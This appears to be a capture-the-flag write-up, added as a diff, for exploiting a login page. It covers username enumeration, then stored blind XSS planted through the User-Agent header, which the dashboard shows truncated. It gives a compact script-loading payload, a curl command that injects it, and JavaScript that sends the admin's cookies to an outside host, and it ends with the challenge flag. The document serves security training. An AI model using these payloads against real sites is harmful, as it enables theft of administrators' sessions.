@@ -1,0 +1,31 @@
+Enumeration : 
+- The system logs failed connection and then display the user agent of the failed connection on the dashboard page.
+- if you try a failed login attempt to your own account you will find that xss is actually possible by injecting
+	js code in the user-agent of the request to login.php (with a wrong password).
+-however to exploit other users to cause a blind xss one must first find the valid admin username, which is
+	very straightforward as the login.php page allows username enumeration by displaying 2 diffrent errors.
+	one if the password is incorrect and another if the user doesn't exist.
+	using the above we can verify that a valid account exists with username : admin.
+
+Exploitation:
+moving forward, it's clear that we need to exploit the xss to leak the admin cookies.
+however there is another limitation in place.
+- the user agent isn't fully printed in the dashboard page, only the first 40 chars appears.
+
+so the challenge is to create a tiny xss payload that will leak the admin cookies.
+
+- to do so, we can use this payload : <script src=//xxx.xxx.xxx.xxx></script>
+
+- then we send a login attempt request for the "admin" user with a wrong password :
+	curl -A "<script src=//192.168.0.x></script>" -X POST -d "username=admin&password=wrongpassword" http://hostname/login.php
+
+which is 39 chars long and it loads external js file for further exploitation, the js code should be server at the root
+level of the domain (it can be easily done by placing the code in the index.html file).
+
+- the hosted index.html file content : 
+	i=new Image;
+	i.src='http://xxx.xxx.xxx.xxx:xx/?c='+document.cookie
+
+Now just wait for the admin to login to his dashboard and get the FLAG
+
+- the final flag is : Flag{C0nt4ct_M3_1f_y0ur_comp4ny_is_hiring}
